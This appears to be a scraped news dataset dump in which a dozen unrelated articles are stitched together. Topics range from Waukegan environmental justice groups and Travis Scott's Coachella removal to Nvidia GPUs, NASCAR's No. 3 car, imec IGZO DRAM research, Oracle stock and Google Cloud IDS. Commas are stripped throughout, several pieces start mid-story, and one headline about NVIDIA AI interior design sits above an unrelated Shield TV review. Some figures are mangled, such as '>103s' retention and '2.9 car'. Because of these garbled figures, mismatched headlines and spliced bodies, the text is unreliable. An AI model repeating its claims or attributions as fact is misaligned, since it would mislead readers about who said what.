According to Candace May Faith in Place’s Lake County outreach coordinator places of worship are the perfect place to begin conversations around environmentalism because there is already a bond and a sense of “joint values.”

May compared the faith aspect of her environmentalism to the civil rights movement in which a great deal of organizing took place within churches.

“It’s a good way to get people to come together. I think Faith in Place helps Christians and people of faith become stewards of the Earth and really see the Earth as a gift from their Creator” May said.

Faith in Place is a member of the coalition that advocated for the Climate and Equitable Jobs Act passed by the General Assembly in September. The bill was designed to improve air quality cut carbon power substantially and incentivize clean jobs especially in communities of color and places where coal-fired electricity plants operate like the Waukegan Generating Station.

The act created 13 clean jobs workforce hubs one of which will be in Waukegan and sets aside $40 million per year in grants for communities that are transitioning away from fossil fuel or coal industries.

Many Waukegan residents hope cleaner industry will replace the fossil fuels and factories that once defined the town including the coal plant that dominates several acres of lakefront property.

Schrader however said NRG plans to continue partial operations at the site with two gas-fired peaking units which do not produce coal ash limiting future development on the lakefront property.

“We will evaluate opportunities to pursue renewable projects at our facilities. Our current development plans at the site include energy storage” Schrader said in an email.

Some residents like Flores hope the land could be repurposed as a solar farm providing clean affordable energy for the community and beyond. Others like Ortiz wonder if the land could be rehabilitated and turned into a lakefront park to create more green space if the company sold the property.

“Not only even going to Chicago but even driving 15 minutes down (the shore) you have Lake Bluff Lake Forest. And they don’t have a coal plant. And they don’t have all these brown fields by the lake” Ortiz said. “And not a lot of people of color live there either. It’s kind of hard not to believe that this is by design that this is on purpose. And so we have to change that.”

According to May children are often the most receptive to learning about environmental work and are eager to make changes in their community. In addition to talking to congregants about how to reduce their carbon footprint May runs a youth program that includes research leadership training and environmental justice discussions.

Barbara Waller is the founder of another organization that helps kids connect with nature and engage in environmental activism. She grew up in the country in a segregated community outside Memphis Tennessee.

“It was sort of just a natural thing to me to just enjoy being in nature: falling among the leaves in the fall and enjoying picking blackberries and making sure you don’t get bitten by a snake” Waller said.

She moved to Waukegan in the ‘90s and several years later read the book “Last Child in the Woods” about the disconnect between children and nature in American society affecting their health and emotional well-being.

The message hit Waller hard and in 2008 she created Cool Learning Experience an all-day summer program.

Waller said the Superfund sites that surround Waukegan and the coal plant just down the road are part of the discussions.

“That’s a part of their history whatever those decisions were made (about) the coal plant or other industries” Waller said. “We just want the children to know the facts. ... We want them to do their own critical thinking.”

Lonna Drobi who has lived in Waukegan for about 25 years enrolled her 9-year-old son Omar in Cool Learning Experiences in 2020. Drobi said the program helps kids express themselves artistically and engage with the community.

“We need to do what we can and not just be so wasteful. Let’s reuse what we can or let’s bless others with it. Let’s take it and make it something else” Drobi said. “I think the program opened his eyes.”

Waller coordinates classes about healthy eating and gardening for kids and adults which led Drobi to set up a vegetable garden in her backyard.

Enrolled at the College of Lake County Flores plans to graduate with a degree in either education or environmental science and take that knowledge back to his alma mater Waukegan High School. He wants to teach a class on environmental justice so students can learn about the things he had to discover by himself.

Although growing up in Waukegan shaped Flores’ activism some transplants also share his sentiments.

Karen Long MacLeod another member of Clean Power Lake County moved to the town in 2007. Her husband opened a business in Waukegan and they decided to invest in the community.

When her husband died a few years later MacLeod said she already felt part of the community and had no interest in leaving.

“We live here; we put down roots. We have family; we have jobs.” MacLeod said. “And just because something isn’t perfect doesn’t mean you abandon it. You try to make it better.”",https://news.google.com/articles/CBMiemh0dHBzOi8vd3d3Lm55ZGFpbHluZXdzLmNvbS8yMDIxLzEyLzEyL3RyYXZpcy1zY290dC1yZW1vdmVkLWZyb20tY29hY2hlbGxhLW11c2ljLWZlc3RpdmFsLWFmdGVyLWFzdHJvd29ybGQtdHJhZ2VkeS1yZXBvcnQv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Travis Scott removed from Coachella after Astroworld tragedy: report,"Travis Scott has reportedly been removed from the upcoming Coachella music festival lineup after 10 people died at his Astroworld event last month.

The Indio Calif. community services manager confirmed to local news station KESQ that Scott will not perform when Coachella returns to the city in April.

Scott has not publicly commented on his Coachella status.

The rapper hosted and headlined the Astroworld Festival at NRG Park in Houston on Nov. 5 where the crowd surged killing 10 people and injuring dozens of others.

In his first interview since the tragedy Scott said he wasn’t aware of the extent of the mayhem until minutes before a post-concert press conference.

“Any time you can hear something like that you want to stop the show” Scott told radio host Charlamagne the God during the 51-minute interview which came out Thursday.

“You want to make sure fans get the proper attention they need. Anytime I could see anything like that I did. I stopped it like a couple times to just make sure everybody was OK. I just really go off the fans’ energy as a collective. … I just didn’t hear that.”

The attendees who died ranged in age from 9 to 27 years old.

An online petition urging the Goldenvoice concert organizer to drop Scott 30 from future festivals has garnered more than 60000 supporters.

The families of multiple Astroworld victims have declined Scott’s offer to pay for funeral expenses.

“As artists we trust professionals to make sure that things happen and that people leave safely” Scott said during his new interview. “This night was just a regular show it felt like to me. People didn’t show up there to just be harmful. People just showed up to have a good time and something unfortunate happened.”",,,,,,

NVDA,Nvidia,https://news.google.com/articles/CBMiZ2h0dHBzOi8vd3d3LnRvbXNndWlkZS5jb20vb3Bpbmlvbi9pLWNhbnQtZ2V0LWV4Y2l0ZWQtYWJvdXQtbnZpZGlhLWdlZm9yY2UtcnR4LTQwLXNlcmllcy1jYXJkcy1oZXJlcy13aHnSAQA?hl=en-US&gl=US&ceid=US%3Aen,I can't get excited about Nvidia GeForce RTX 40 series cards — here's why,"Nvidia’s GeForce RTX 30 series graphics cards are over a year old but remain remarkably hard to find due to the ongoing global chip and supply shortage. I became so frustrated trying to find an Nvidia RTX 3080 Ti graphics card that I bought a pre-built gaming rig with said GPU. With the chip shortage projected to last well into 2023 by some analysts finding an RTX 30 series card will continue to be a difficult task.

Despite the hardships customers are having getting Nvidia’s current-gen graphics cards we’re already hearing rumblings about the company’s next-gen GPUs. As we previously reported a pay-walled story from DigiTimes claimed that the Nvidia GeForce RTX 40 series cards are set to arrive in 2022. That's backed up by Nvidia CFO Colette Kress who recently said the company aims to have improved GPU supplies in the second half of 2022 when the cards are projected to release (via PCMag).

These reports aren’t exactly world-shattering. Companies have to stay ahead of the competition especially in the ultra-competitive tech sectors. There was no doubt Nvidia would be preparing to unleash the successor line to the RTX 30 series. The cards sound impressive especially if the reports are accurate about them using TSMC’s 5nm manufacturing process and Lovelace architecture; which would make for some truly powerful and efficient graphics cards.

However considering the significant challenge of obtaining Nvidia's current GPUs I find the idea of the RTX 40 series cards launching anytime in the near future somewhat frustrating. Why should people get excited about new cards when they can’t find current-gen GPUs in stock?

If Nvidia and big-box retailers don't find a way to stop scalpers...we're all going to be outside the club hatin' while the scalpers the retailers and Nvidia are inside swimming in cash and buttery graphics."" Sherri L. Smith Laptop Mag EIC

This is a sentiment shared by Laptop Mag Editor in Chief Sherri L. Smith who I reached out to in order to get her thoughts on the situation.

“I'm always a fan of the newest most powerful tech” says Smith. “And I'm fine with it costing exorbitant prices when it first launches. What I can never co-sign is the shiny new expensive tech being straight up unavailable. Such is the case with Nvidia's 30 Series GPUs. Since their launch my fellow gamers have more often than not been unable to get their hands on even the weakest cards in the line let alone a 3080 or a 3090. And if they do manage what is considered by many to be an impossible task more often than not it's because they paid a ridiculous markup.”

She had this to say about the rumored RTX 40 series cards:

“Can I fault the wheels of process and capitalism? No and maybe. I do want to salivate over the new hotness but I also want consumers to get a fair shot to get their hands said fire. That's not going to happen and it's infuriating. And yes Nvidia is probably going to come out with cards designed specifically to ward off crypto miners. But none of that matters if Nvidia and big-box retailers don't find a way to stop scalpers from using bots to buy out the entire inventory. Until then we're all going to be outside the club hatin' while the scalpers the retailers and Nvidia are inside swimming in cash and buttery graphics.”

As Sherri said it’s easy to drool over the prospect of new and more powerful graphics cards. Despite having an RTX 3080 Ti for a little under three months I’m curious to see what the RTX 40 series can bring to the table. Games look absolutely phenomenal on even the cheaper 30 series cards. How much better will titles specifically optimized to run on 40 series GPUs look? The imagination can run wild pondering the question. But this excitement is curtailed knowing that if things continue as they have for nearly two years few of us will actually get to experience what the new Nvidia graphics cards can offer.

IGN Associate Tech Editor Taylor Lyles shares a similar view: “I am perplexed at the idea that an RTX 40 series could arrive as early as next year. Nvidia is dominating the GPU market right now there is no need for them to put out more powerful cards when the RTX 30 series is just as capable of whatever graphic-intensive games are coming out right now.”

Sherri Taylor and I are coming at this from the perspective of customers. We understand the reality of what’s happening with regards to supply but it’s difficult for us to not get worked up over other gamers’ inability to easily purchase Nvidia’s current GPUs. I personally don't see things greatly improving next year. However the industry analysts I reached out to see things more objectively.

The current supply crunch is incredibly frustrating for anyone looking to buy a graphics card for gaming VR or work. However Nvidia can’t just stand still or it will be uncompetitive when supply finally catches up with demand."" Avi Greengart Techsponential

“The current supply crunch is incredibly frustrating for anyone looking to buy a graphics card for gaming VR or work” says Techsponential president Avi Greengart. “However Nvidia can’t just stand still or it will be uncompetitive when supply finally catches up with demand. Besides it’s not like launching new products constrains supplies of existing products – at worst newer better and often cheaper GPUs replace the prior generation. In many cases it’s additive as the newest products are produced on new smaller process node fabrication lines.”

Gartner VP analyst Alan Priestly has similar thoughts. He also believes the smaller process node fabrication lines will help improve the chip shortage problem.

“RTX4xxx GPUs are expected to be on TSMC 5nm process” says Priestly. “This means smaller die size which in turn equals more die per wafer and thus increased GPU availability."" With regard to Nvidia staying ahead of the competition Priestly said: “Intel is entering the [GPU] market so Nvidia has to introduce new GPUs to keep ahead of its competition. Just sticking with current 30x0 GPUs will result in loss of market share as gamers move to newer high perf GPUs from other vendors.”

The price of the rumored RTX 40 GPUs is something else to take into consideration. We recently reported on a tweet posted by Razer CEO Min-Liang Tan  where he said next-gen gaming laptops from the likes of the Razer Blade series will see an increase in price starting next year. The inflated costs according to Tan are tied with the ""significant increases in component costs.” There is no reason to believe this won’t also affect the price of Nvidia’s graphics cards.

“We should definitely expect an increase in pricing not so that Nvidia can make up the difference between MSRP and what resellers are charging but to cover the increase in Nvidia’s actual costs” says Greengart. “Transportation and labor costs have shot up input costs have risen and the fabs are charging more to manufacture the chips because well because they can.”

While I admittedly have a bleak and perhaps too pessimistic view on where things stand with Nvidia's RTX 40 series cards I recognize that the chip and supply shortage gripping the tech industry will eventually subside. The global pandemic has overturned all aspects of life but the world will eventually settle on a new normal. Perhaps things will be better by the time the new Nvidia GPUs arrive in 2022. That’s little solace but it’s better than nothing.

For now I’ll continue enjoying the benefits provided by my RTX 3080 Ti-powered gaming rig. Even with new GPUs on the horizon I know that games will look amazing on my machine for many years to come. PC game developers won’t suddenly stop optimizing titles for 30 series cards when next-generation GPUs arrive. This is something all PC gamers should keep in mind as well.

So I’ll continue enjoying what I have and try to be optimistic for what the future holds. Even if I have to wait an extra year or two for Nvidia’s RTX 40 series graphics cards to actually become available.",https://news.google.com/articles/CBMiT2h0dHBzOi8vODAubHYvYXJ0aWNsZXMvbnZpZGlhLXMtbmV3LWFpLXByb2NlZHVyYWxseS1nZW5lcmF0ZXMtaW50ZXJpb3ItZGVzaWducy_SAQA?hl=en-US&gl=US&ceid=US%3Aen,NVIDIA's New AI Procedurally Generates Interior Designs,"What does the whole thing mean in a few words?

NVIDIA has done a great job offering software updates that continually make the Shield TV better than before and the 16GB is a great option for any habitual streamer. So yes it's absolutely your best bet for an Android TV box.

NVIDIA is still king of Android TV

The NVIDIA Shield TV is a full-featured streaming box that runs on the latest Android TV software. That means it has both Google Assistant and 4K Chromecast functionality built right in along with a host of other great features. All of that makes the Shield a stand out product.

It also offers the best internal specs and features on a TV streaming box and comes packaged with a sleek remote that includes a built-in microphone for use with the Google Assistant. You can also plug in a keyboard and mouse or connect Bluetooth devices for both gaming or for more mundane things like entering passwords and searching.

The NVIDIA Shield still offers the best streaming box experience you will find in 2021.

On the software side the Shield TV (2019) ships with Android 9 Pie and NVIDIA has done a good job of keeping the whole product line up to date over the past three years. You'll be able to access the best Android apps developed for the Android TV platform which includes all the most popular services — YouTube Netflix Hulu Amazon Prime Spotify and etc. — along with media streaming platforms like Kodi and Plex for those who have their own media collections. Everything is delivered in an easy-to-use user interface that will offer home screen recommendations based on the services and shows you watch.

If the Shield just did streaming really well as it does it would still be our top pick but NVIDIA has also equipped the Shield TV with enough processor power for gaming. Not only can you choose from the growing library of games from the Google Play Store but NVIDIA also has its own library of popular PC games you can download and play along with the NVIDIA GeForce Now streaming service which lets you cast your favorite games from your PC to your living room TV.

With the new redesign NVIDIA moved away from the classic build of the original Shield TV leaving that for the updated Shield TV Pro (2019). This new tubular design for the Shield TV (2019) offers a much slimmer and lower profile — the tube itself is just marginally larger than the included remote. While this makes it easier to try and tuck away your Android TV there are some sacrifices.

Gone are the extra USB ports so you can't hook up an external hard drive to the Shield TV (2019). However you'll have access to a microSD card slot which is compatible with any card with the UHS-1 rating and above. The problem here is that flash storage is still much pricier than what you will find with a traditional external hard drive. Nonetheless the ability to expand the storage on the new Shield TV even if it's not as much as you may want is welcome.

One other potential hiderance comes in gaming as you won't be able to use this to play those special Advanced Android Gaming games. These were designed specifically for the Shield TV but the standard version is not capable of playing this according to NVIDIA.

Do you really need the extra storage?

Those who want the best Android TV experience and primarily rely on streaming services for your media playback needs will be thrilled with the new Shield TV (2019). You are still provided with the ability to expand storage (albeit limited) and you'll get a built-in Chromecast with 4K playback Gigabit Ethernet along with compatibility with Dolby Atmost and Dolby Vision.

All of this makes for an amazing package but with just 8GB of onboard storage you'll likely want to pick up a microSD card just to have enough room for your various streaming apps. If you planned on using this as your Plex Media Server we would recommend spending an extra $50 and grabbing the Shield TV Pro (2019) thanks to the two USB 3.0 ports. The NVIDIA Shield TV can be the anchor to not only your living room entertainment but also the rest of your smart home devices thanks to Google Assistant now being fully integrated into the NVIDIA Shield TV's software.

That being said the NVIDIA Shield TV may be more than a casual streamer actually needs. If you fit that bill then you may want to consider the latest version of the Amazon Fire TV Cube. When it comes to pitting the NVIDIA Shield TV versus the Amazon Fire TV Cube both devices do a good job of streaming 4K content and feature sleek and intuitive smart voice remote. However the Fire TV Cub doesn't have the same power and won't appeal to serious gamers.

According to ITHome NVIDIA is preparing to launch its GeForce MX550 discrete GPU based on Ampere architecture. This card would be the first in the series to feature only 2GB memory.

An undisclosed graphics card appears with Lenovo laptop over at Geekbench website. The discrete GPU is listed as ‘Graphics Device’ which means it is an unreleased product and its final retail name is unknown. ITHome claims that this should be the upcoming GeForce MX550 entry-level graphics card supposedly based on Ampere GA107 GPU. The card would feature 16 Compute Units which in this case means 16 Streaming Multiprocessors each with 128 CUDA cores. This likely means a partial implementation of the GA107 GPU featuring just as many cores as GeForce RTX 3050 non-Ti (2048).

Undisclosed NVIDIA GPU with 2GB memory Source: Geekbench

The graphics card is to be offered with an Intel Core i7-1260P 12-core/16-thread CPU which is part of the Alder Lake-P (U28) series supposedly launching at CES 2022. Such a system would be targeting sub-50W configuration for CPU+GPU which is typically reserved for ultra-thin designs. The appearance of the GeForce MX550 is especially interesting considering it might launch at the same time as Intel’s upcoming entry-level Arc Alchemist DG2-128. However for some reason Lenovo opted for an NVIDIA GPU in this case.

Intel Core i7-1260P Alder Lake-P CPU Source: Geekbench

The MX550 would feature more than twice the core count of the MX450 based on Pascal GP107 GPU (2048 vs 896). This is mainly because Ampere architecture doubled the FP32 cores over the previous generation however as it shows this does not necessarily translate into doubled performance. NVIDIA has only started using GDDR6 memory with MX450 but it is unclear how much faster would MX550 memory be compared to these 1.5-year-old G6 models.

Rumored GeForce MX550 vs MX450 Source: Geekbench

Performance-wise we are looking at 15% higher performance compared to MX450 (with Core i5-11300H 35W CPU). This is obviously not an apples-to-apples comparison but it sets a good baseline of what to expect from NVIDIA’s new MX series. At this moment however there is no information about other MX500 series GPUs. It is yet to be confirmed if MX550 uses GA107’s full 128-bit memory bus or rather relies on a shorter 64-bit bus instead.

“Oh my gosh did you just hear that” patron Riley Winter 23 who was shopping for a toy for her niece said. “That is so sweet.”

Winter was referring to a request by Ben Curzon 5 for help to find a gift for his aunt.

“Let’s pick something for Ashley” Ben said. “She likes beautiful things.”

Curzon was one of 24 elementary and middle school students nominated at their respective schools to participate in the goodwill event organized by the Twin Lakes Professional Police Association.

“It’s just a great time to get out with these kids and have a good time and enjoy the holiday season with them” Officer Kevin Saunders of the Twin Lakes Police Department said. “It provides a way to meet with the kids outside of a law enforcement or emergency scenario.”

Students were paired with a member of the TLPD Twin Lakes Fire and Rescue or the Randall Fire Department to shop for Christmas gifts.

Hadley Churchill 8 found gifts and things to share with two brothers and a sister and had just as much fun helping wrap the presents at a station manned by volunteers as she did shopping for them.

“She was very generous” Morgan Strom a dispatcher who helped Hadley shop. “I had to push her to buy presents for herself.”

Hadley said the “Ultimate Science Kit” that includes a gemology activity is for her.

“I love science” Hadley said adding she can identify all the gems pictured on the box. “I have a book about them and I’ve read so many books about it in my classroom.”

Each child had $200 to spend thanks to the generosity of local businesses individuals and members of the Twin Lakes Professional Police Association.

Officer Matt Yusten helped Mason Tarpey 9 find the items on his list.

“I actually thought I was in trouble even though I didn’t do anything” Tarpey said of the moment he was called to the office where he learned he had been chosen to participate this year. “It was a big surprise.”

A similar event sponsored by the Lake Geneva Police Department was also taking place at the store.

“It was so nice to see their smiling faces and watch them pick out toys and gifts for their families” Audrey Magnuson of Lyons said. “They are being so thoughtful. Just warms my heart. Made my day.”

There was a great sadness and confusion throughout the world of NASCAR.

However the next week the racing schedule continued. Richard Childress announced that Kevin Harvick would drive the 2.9 car (Earnhardt’s No. 3 team) and he drove to the win the very next week at Atlanta Motor Speedway.

However following Earnhardt’s death Childress stated he’d never run the No. 3 car again.

For over a decade the No. 3 car was absent from the NASCAR Cup Series. Meanwhile Austin Dillon was climbing through the lower ranks. He piloted a No. 3 dirt late model among other machines on his route to NASCAR.

In 2014 Richard Childress announced that his grandson would move up to the NASCAR Cup Series. In doing so Dillon would pilot the No. 3 car.

In defense Richard Childress opened his NASCAR career as a driver with the No. 3 machine. It was his number before handing it off to Earnhardt.

The Earnhardt family was torn on it’s return. They recently discussed the No. 3 number…

Earnhardt family comments on the return of the No. 3 car

Danny Earnhardt is the brother of the late Dale Earnhardt Sr. Danny himself passed away on Friday. But just a few months ago he spoke on the No. 3.

“That other thing I didn’t really have hard feelings about it is putting the No. 3 back on the track. Because Richard said he would never do it. Richard told momma he wouldn’t never do it. But he did and that’s fine” Danny Earnhardt stated via the Dale Jr Download before he passed away.

Dale Jr comments

“It is” Dale Earnhardt Jr son of Earnhardt Sr responded.

“When Richard called and said ‘Hey I want to bring the No. 3 back.’ So if we’re doing double digits we’re not doing triple numbers you can’t really retire numbers. You can’t retire the No. 43 and all that.”

“And there’s these kids that play sports. Austin Dillon wore a No. 3 on the back of jersey when he was playing T-Ball as an 8-year-old kid. I’m just making this shit up but he’s wore this No. 3 on the back of his jersey all through his childhood.”

“And to deny him a chance to continue to do that it means something to him personally. I kinda felt like it was fair.”

Dale Jr concluded “I kinda thought that they should have maybe changed the font.”

Dale Earnhardt Jr recalls his trip to the hospital in 2001

On the same topic Dale Earnhardt Jr and Danny Earnhardt recalled the tragic day at Daytona. The two of them ended up riding in a car together on their route to the hospital.

“I was at the infield care center. Then the next thing I know we was at the hospital” Earnhardt says his memory is spotty of that day.

“They pulled us up to the emergency room entrance. Me and you got out and walked in there. As soon as we walked in there the room dad’s in is right there.”

“Nothing stopped me from walking in there and taking a look. There was 30 people in that entrance way. Either there because of dad or there because they had their own personal reasons of a another family member in that unit or whatever.”

Dale Jr stated “It was a busy spot. I remember going in there.”

Danny Earnhardt added “Teresa asked me if I wanted to go in. I told her no. So I didn’t go in. You did I guess.”

Dale Jr explained “I just remember peaking my head around the corner and looking in there.”

“Then we were taken to a smaller room. Some man came in and started explaining to Teresa about what the next steps were. What they were going to say to the public and what all was going to happen next.”

“I got out of there and back to you. Remember I looked at you and said ‘You wanna get out of here?’ You said ‘Yeah.’ Because we knew dad was gone. There just wasn’t no reason to be there.”

Dale Jr added “It was tough. I don’t remember getting on the plane I don’t remember going home. I remember we all ended up at grandma’s house I think it was the same night whole family was there.”

Vasko a three-year starter for Oscar Smith wrote on Twitter that he had “recently been presented with additional opportunities that I believe [are] a better fit for me to achieve my education and career goals.”

“I have informed ODU that I am de-committed” Vasko added. “This is a very difficult decision for me and one that I have thought long and hard about.”

Vasko’s decision came about two weeks after former Notre Dame quarterback Brendon Clark announced he was transferring to Old Dominion. ODU (6-6) has qualified for a bowl with five consecutive wins this season led by redshirt freshman quarterback Hayden Wolff. The Monarchs play Tulsa on Dec. 20 in the Myrtle Beach Bowl.

Vasko is the most prolific quarterback in Hampton Roads over the past two seasons. During an abbreviated spring 2021 season he accounted for 2230 total yards and 34 touchdowns with no interceptions in nine games.

He followed that this season with 2977 passing yards and 37 touchdown passes and accounted for a state-record 10 TDs in a region playoff victory over Cosby.

In Saturday’s state championship game — played at ODU’s S.B. Ballard Stadium — Vasko completed 9 of 17 passes for 134 yards and two touchdowns.

Material Templating using BCP Thin Films

Due to the potential of self-assembled block copolymer (BCP) thin films to instantaneously produce different nanostructures they have appeared as a novel templating method with several benefits. This includes a decrease in supply and operating expenses a small size that is not achieved by standard methods and simple integration into the present technology for mass production.

However BCP-based nanodevices are not readily suitable for many applications due to their restricted structural qualities.

In comparison to its synthetic alternatives polystyrene BCP thin film has weak mechanical thermodynamic and electrical performance.

Postassembly treatment is usually necessary to convert these polymeric structures into more usable synthetic nanoparticles.

BCP Derived Methods for Nanodevice Fabrication

In recent years there has been a surge in the production of nanodevices employing block copolymer-derived technology. A basic BCP film is composed of two insoluble polymer blocks that are chemically bonded and are stacked on top of each other. Using a heat processing process or by exposing the thin films to liquid-vapor BCP thin films can be self-assembled on a variety of substrates including silicon wafers.

It is possible to fabricate nanowire-based electronics such as semiconductors and monitors using BCP thin films because of their wire-like structure at the nanoscale. The spherical shape nanomaterials are employed for designing high-density nanodot arrays for application in storage devices such as flash memory.

However in order to use BCP-based nanoparticles for practical electronic applications it is important to change their geometries for them to display conductive semi-conductive and optical characteristics.

Modification Strategies for BCP-based nanostructures

One of the easiest ways to convert BCP patterns into electroactive nanostructures is achieved with the lift-off technique.

The lift-off technique involves depositing a thin layer of necessary material onto a substrate having plastic patterns and then washing away the portion of the prepared film that remains on the material when the polymer is disintegrated in a solvent.

A material bonding approach directed by the disintegration dispersion and reactivity of metal precursors with polymeric substrates called infiltration is another means to turn BCP patterns into synthetic nanomaterials.

Based on the kind of precursors utilized the infiltration procedure may be divided into two types: vapor-phase infiltration (VPI) and liquid-phase infiltration (LPI).

These methods allow inorganic materials to grow inside an organic matrix resulting in organic-inorganic composites. Due to the merging of various initial elements at the cellular scale such composites often have remarkable material characteristics.

VPI has been shown to improve a variety of polymeric characteristics including physical toxicological structural optical and thermodynamic properties. Advanced sensors photodiodes gas screens and gas filters are some of the uses for VPI hybrids. Furthermore the BCP self-assembly method may be used in conjunction with the VPI method to make intricate 3D synthetic nanomaterials that are beneficial in electrical device applications.

In the liquid-phase infiltration (LPI) technique inorganic salt solutions are obtained by adding the salts to water or other solvents.

Direct contact between inorganic materials in the form of liquid metal salts and reactive functional molecules allows for penetration. Combining precision processing of BCP thin films with LPI provides perpendicularly aligned nanorods and nanoparticles with consistent material characteristics which are useful in various applications.

Conclusion and Future Perspective

Self-assembly modification methods such as thin-film accumulation VPI and LPI hybridization and plasma engraving pattern technique have facilitated the production of semiconductor materials metal alloys and conductive thermoplastic nanodevices for use in devices such as photonic detectors and solar cells amongst other applications.

Because of their sizable adaptability simplicity of manufacturing and variety of synthetic pattern generation and conversion techniques self-assembled BCP thin films have the potential to be used in a broad range of electric mechanical and photonic products in the future.

In this article Gouri Sankar Kar memory program director at imec reveals an IGZO-based DRAM cell that has “excellent specifications” for DRAM memory applications thanks to an optimization of the IGZO transistor architecture. In addition he shows the first lifetime estimation of the DRAM cell’s key components based on new insights into the reliability of IGZO thin-film transistors.

The results are presented in two papers at this year’s IEEE International Electron Devices Meeting (IEDM 2021).

Towards high-density 3D DRAM

At last year’s International Electron Devices Meeting (2020 IEDM) imec demonstrated for the first time a capacitor-less dynamic random-access memory (DRAM) cell implementing two indium-gallium-zinc-oxide (IGZO) thin-film transistors (TFTs) and no capacitor. This novel 2-transistor-0-capacitor (2T0C) DRAM cell architecture promises to overcome the key obstacles for classical 1-transistor-1-capacitor (1T1C) DRAM density scaling i.e. the large off-current of Si transistors at small cell sizes and the large area consumed by the storage capacitor. In a 2T0C IGZO-TFT DRAM cell there is no need for a storage capacitor as the parasitic capacitance of the read transistor serves as the storage element. In addition IGZO-TFTs are known for their very low off-current leading to enhanced retention of the memory cell. Finally the ability to process IGZO-TFTs in the back-end-of-line (BEOL) allows to reduce the DRAM memory’s footprint (by moving the memory cell under the memory array) and to stack individual DRAM cells – hence providing a path towards high-density 3D DRAM. This evolution is needed to continue to provide sufficient DRAM capacity for data-intensive applications (such as artificial intelligence internet-of-things data centers and cloud computing).

In 2020 a first 2T0C IGZO-based DRAM cell with >400s retention time could be demonstrated which led to significantly reduced refresh rate and power consumption compared to classical DRAM variants. The devices were manufactured on 300mm wafers and gate lengths were scaled down to 45nm. However in this first ‘conceptual’ demonstration the IGZO TFTs were not optimized for maximal retention and an assessment of the endurance (i.e. the number of read/write cycles before failure) was still missing. Also at that time no accurate model existed for predicting the lifetime of the IGZO devices.

>103s retention unlimited endurance and gate length scalability down to 14nm

At the 2021 IEDM imec presents a fully 300mm BEOL compatible IGZO-based capacitorless DRAM cell with improved specifications i.e. >103s retention and unlimited (>1011) endurance. These results were obtained after selecting the most optimal integration scheme for the single IGZO transistors i.e. a gate-last integration scheme with buried oxygen tunnel and self-aligned contacts. The implementation of a buried oxygen tunnel in combination with an anneal in O 2 ambient was proven to reduce the oxygen-vacancy concentration in the IGZO channel without impacting the series resistance at source and drain region – leading to larger on-current and lower off-current.

With this architecture the gate length of the IGZO TFT could be scaled down to an unprecedented 14nm while still preserving >100s retention. The retention at small gate length could be further optimized by controlling the threshold voltage (V t ) through equivalent oxide thickness (EOT) scaling by contact resistance improvement and by reducing the IGZO layer thickness. When the latter thickness is reduced to 5nm the oxygen tunnel and anneal step in O 2 can even be omitted – leading to a much-simplified integration approach.

More details on the selected integration approach and on the achieved device specifications are described in the 2021 IEDM paper ‘Tailoring IGZO-TFT architecture for capacitorless DRAM demonstrating >103s retention >1011 cycles endurance and L g scalability down to 14nm’ by A. Belmonte et al.

Figure 1: (a) Schematic and (B) TEM image of a single IGZO transistor in a gate-last architecture with oxygen tunnel and 14nm gate length (as presented at IEDM 2021).

Lifetime estimation based on PBTI reliability modelling

So far an accurate model for predicting the IGZO-based DRAM lifetime is lacking since the IGZO TFT’s degradation mechanisms are not fully understood. IGZO transistors are inherently n-type devices and this points to positive bias temperature instability (PBTI) as possibly the main degradation mechanism.

PBTI is a well-known aging mechanism in Si n-type metal-oxide-semiconductor field-effect transistors (MOSFETs) where it can severely affect the device performance and reliability. It typically manifests itself as an undesirable shift of the device threshold voltage and a decrease of the drain current. For these Si-based devices PBTI is ascribed to the presence of electron traps in the gate dielectric trapping charge carriers from the device conduction channel.

Most of the existing reliability assessments on IGZO TFTs neglect however the impact of the gate dielectric. Imec has for the first time studied the impact of the gate dielectric on the PBTI of IGZO TFTs. The results are summarized in the IEDM 2021 paper ‘Understanding and modelling the PBTI reliability of thin-film IGZO transistors’ by A. Chasin et al.

The team found that four different mechanisms play a role in the degradation process each with different time kinetics and activation energies. They can be mainly ascribed to both electron trapping in the gate dielectric and to the release of hydrogen species from the gate dielectric into the IGZO channel during PBTI stress.

Figure 2: Time to failure for IGZO TFTs (with 12nm thick amorphous IGZO film) based on different gate dielectrics. Gate-dielectric optimization enables substantial lifetime enhancement from about 20 days to about one year at operating conditions as shown in the figure. Ultimate target is a time to failure of 5 years (as presented at IEDM 2021).

The imec team has combined these multiple degradation mechanisms into a model which makes it possible to predict the IGZO TFT lifetime at target operation conditions. The model is found to fit to experimental data and can be used to propose optimizations for enhancing the lifetime. For example by reducing the gate dielectric thickness the predicted time to failure can be enhanced from about 20 days to about one year.

Conclusion

Improvements to the IGZO-based DRAM cell architecture and integration have enabled 2T0C DRAM memory cells with >103 retention unlimited endurance and gate length scaling down to 14nm. These specifications make capacitor-less IGZO-DRAM a suitable candidate for realizing high-density 3D DRAM memories. The device improvements were complemented with new insights into the IGZO TFT’s reliability revealing different degradation mechanisms responsible for the PBTI. These formed the key ingredients of an accurate model with which the lifetime of the DRAM memory’s key components can be predicted.

Deutsche Bank analysts wrote that the next leg up in ORCL would be driven by confidence in OCI (Oracle Cloud Infrastructure) as a credible player in the broader public cloud market despite its valuation multiple that hasn’t been seen for more than 15 years.

For the second time in 20 years Oracle stock had its best day since March 2020. With the spike its market cap increased by almost $38 billion to $280.6 billion.

In the year ended May 31 2021 Ellison was the largest shareholder and the founder of Oracle.

This core network security offering helps detect network-based threats and helps organizations meet compliance standards that call for an intrusion detection system.

Earlier this year the company announced the public preview of Cloud IDS as a new security network offering. It is generally available now including new enhancements such as service availability in all regions autoscaling an automated daily update of detection signatures support for customers’ HIPAA compliance requirements ISO27001 certification and integration with Google’s security analytics platform Chronicle. Note that in the preview the offering was already integrated with five platforms from other vendors: Splunk Cloud Platform Splunk Enterprise Platform Exabeam Advanced Analytics The Devo Platform and Palo Alto Networks Cortex XSOAR and the company plans more integrations in 2022.

Cloud IDS is built with Palo Alto Networks’ threat detection technologies which provide high levels of security efficacy that enable customers to detect malicious activity with few false positives. Furthermore according to the latest Google Cloud blog post Cloud IDS features simple setup and deployment and gives customers visibility into traffic entering their cloud environment (north-south traffic) and into traffic between workloads (east-west traffic). It empowers security teams to focus their resources on high-priority issues instead of designing and operating complex network threat detection solutions.

Customers can implement Cloud IDS into their virtual cloud networks to keep networks safe. Jonny Almaleh PSO Network specialist at Google Cloud explains in an earlier blog post on Cloud IDS:

To provide visibility into threats and intrusions detected by IDS instances Cloud IDS feeds Threat Logs and Security Alerts into Cloud Logging and the Cloud IDS user-interface in the customer project. This is all done under the hood making it simple to deploy and manage Cloud IDS.

